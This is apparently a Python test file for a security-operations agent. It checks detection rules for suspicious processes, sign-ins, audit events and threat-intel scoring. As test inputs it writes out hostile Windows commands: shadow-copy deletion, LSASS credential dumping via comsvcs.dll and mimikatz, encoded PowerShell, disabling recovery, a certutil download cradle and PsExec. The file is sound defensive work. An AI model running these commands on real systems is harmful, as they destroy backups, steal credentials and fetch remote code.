"""Detection heuristics and threat-intel scoring."""
from __future__ import annotations

import unittest
from datetime import datetime, timedelta, timezone

from soc_agent.agents import analysis
from soc_agent.connectors.base import AuditEvent, NetworkConnection, ProcessEvent, SignIn
from soc_agent.models import Indicator, IndicatorReputation, IndicatorType, TISourceResult, TIVerdict
from soc_agent.policy import Policy
from soc_agent.scoring import aggregate_reputation

from .helpers import POLICY_PATH

NOW = datetime(2026, 9, 30, 12, 0, tzinfo=timezone.utc)


def ago(m: float) -> datetime:
    return NOW - timedelta(minutes=m)


def proc(cmd: str, process: str = "x.exe", parent: str = "explorer.exe", sha: str = "", signer: str = "") -> ProcessEvent:
    return ProcessEvent(time=NOW, process=process, command_line=cmd, parent=parent, sha256=sha, signer=signer)


class BehaviorTests(unittest.TestCase):
    def names(self, *cmds: str) -> set[str]:
        return {s.name for s in analysis.analyze_processes("H", [proc(c) for c in cmds])}

    def test_detects_known_bad(self):
        self.assertIn("Shadow copy deletion", self.names("vssadmin.exe delete shadows /all /quiet"))
        self.assertIn("Shadow copy deletion", self.names("wmic shadowcopy delete"))
        self.assertIn("Credential dumping tool / LSASS dump",
                      self.names(r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 712 C:\t\l.dmp full"))
        self.assertIn("Credential dumping tool / LSASS dump", self.names("m.exe sekurlsa::logonpasswords"))
        self.assertIn("Encoded PowerShell command", self.names("powershell -enc SQBFAFgAIAAoAE4AZQB3AC0A"))
        self.assertIn("Encoded PowerShell command", self.names("powershell.exe -EncodedCommand SQBFAFgAIAAoAE4A"))
        self.assertIn("System recovery disabled", self.names("bcdedit /set {default} recoveryenabled No"))
        self.assertIn("Download cradle", self.names("certutil.exe -urlcache -split -f http://x/a.exe a.exe"))
        self.assertIn("Remote execution tool", self.names(r"PsExec64.exe \\srv cmd"))

    def test_no_false_matches(self):
        self.assertEqual(self.names(
            "powershell.exe -ExecutionPolicy Bypass -File C:\\scripts\\backup.ps1",
            "vssadmin list shadows",
            "notepad.exe C:\\notes\\execution-plan.txt",
            "C:\\Program Files\\App\\app.exe --encoding utf8"), set())

    def test_office_spawn_and_dedupe(self):
        sigs = analysis.analyze_processes("H", [
            proc("powershell -enc SQBFAFgAIAAoAE4AZQB3", process="powershell.exe", parent="WINWORD.EXE"),
            proc("powershell -enc SQBFAFgAIAAoAE4AZQB4", process="powershell.exe", parent="WINWORD.EXE")])
        self.assertEqual(sorted(s.name for s in sigs),
                         ["Encoded PowerShell command", "Office application spawned a script host"])

    def test_beaconing(self):
        conns = [NetworkConnection(remote_ip="203.0.113.66", remote_port=443, count=64, process="evil.exe"),
                 NetworkConnection(remote_ip="10.0.0.5", remote_port=445, count=500),
                 NetworkConnection(remote_ip="52.96.10.12", remote_port=443, count=6),
                 NetworkConnection(remote_ip="not-an-ip", count=99)]
        p = Policy.load(POLICY_PATH)
        sigs, beacons = analysis.analyze_connections("H", conns, p.is_internal_ip)
        self.assertEqual(beacons, ["203.0.113.66"])
        self.assertEqual(len(sigs), 1)

    def test_trusted_signer(self):
        sig = analysis.trusted_signer_signal("H", [proc("x", sha="ab" * 32, signer="Contoso IT")], {"ab" * 32},
                                             ["Contoso IT"])
        self.assertIsNotNone(sig)
        self.assertLess(sig.weight, 0)
        self.assertIsNone(analysis.trusted_signer_signal("H", [proc("x", sha="ab" * 32, signer="Evil Corp")],
                                                         {"ab" * 32}, ["Contoso IT"]))


class IdentityTests(unittest.TestCase):
    def test_impossible_travel_and_mfa_fatigue(self):
        signins = [SignIn(time=ago(90), ip="20.1.1.1", country="US", city="KC"),
                   *[SignIn(time=ago(44 - i), ip="198.51.100.23", country="SG", success=False, mfa_denied=True,
                            result_code="500121") for i in range(4)],
                   SignIn(time=ago(36), ip="198.51.100.23", country="SG", risk="high")]
        names = {s.name for s in analysis.analyze_signins("u", signins)}
        self.assertIn("Impossible travel", names)
        self.assertIn("MFA fatigue", names)
        self.assertIn("Risky sign-in (high)", names)

    def test_travel_far_apart_is_fine(self):
        signins = [SignIn(time=ago(600), ip="1.1.1.1", country="US"), SignIn(time=ago(10), ip="2.2.2.2", country="GB")]
        self.assertEqual(analysis.analyze_signins("u", signins), [])

    def test_password_attack(self):
        fails = [SignIn(time=ago(30 - i * 0.5), ip="192.0.2.77", success=False, result_code="50126") for i in range(12)]
        self.assertEqual([s.name for s in analysis.analyze_signins("u", fails)], ["Password attack against account"])
        with_success = fails + [SignIn(time=ago(1), ip="192.0.2.77")]
        self.assertEqual([s.name for s in analysis.analyze_signins("u", with_success)],
                         ["Successful sign-in after password attack"])

    def test_audit(self):
        sigs = analysis.analyze_audit("u", [AuditEvent(time=NOW, operation="New-InboxRule", detail="ForwardTo x"),
                                             AuditEvent(time=NOW, operation="Add member to role"),
                                             AuditEvent(time=NOW, operation="Update user")])
        self.assertEqual({s.name for s in sigs}, {"Suspicious mailbox rule", "Privileged role change"})


class ReputationTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.p = Policy.load(POLICY_PATH)

    def rep(self, *sources, allow=False):
        return aggregate_reputation(IndicatorReputation(
            indicator=Indicator(type=IndicatorType.IP, value="203.0.113.1"), sources=list(sources), allowlisted=allow),
            self.p)

    def test_agreement_bonus(self):
        r = self.rep(TISourceResult(source="a", verdict=TIVerdict.MALICIOUS, score=85, malware_family="X"),
                     TISourceResult(source="b", verdict=TIVerdict.MALICIOUS, score=80, malware_family="X"))
        self.assertEqual((r.verdict, r.score, r.malware_family), (TIVerdict.MALICIOUS, 90, "X"))

    def test_unknown_and_clean(self):
        self.assertEqual(self.rep().verdict, TIVerdict.UNKNOWN)
        self.assertEqual(self.rep(TISourceResult(source="a", verdict=TIVerdict.CLEAN)).verdict, TIVerdict.CLEAN)
        self.assertEqual(self.rep(TISourceResult(source="a", verdict=TIVerdict.SUSPICIOUS, score=40)).verdict,
                         TIVerdict.SUSPICIOUS)

    def test_allowlisted_wins(self):
        r = self.rep(TISourceResult(source="a", verdict=TIVerdict.MALICIOUS, score=99), allow=True)
        self.assertEqual((r.verdict, r.score), (TIVerdict.CLEAN, 0))


if __name__ == "__main__":
    unittest.main()
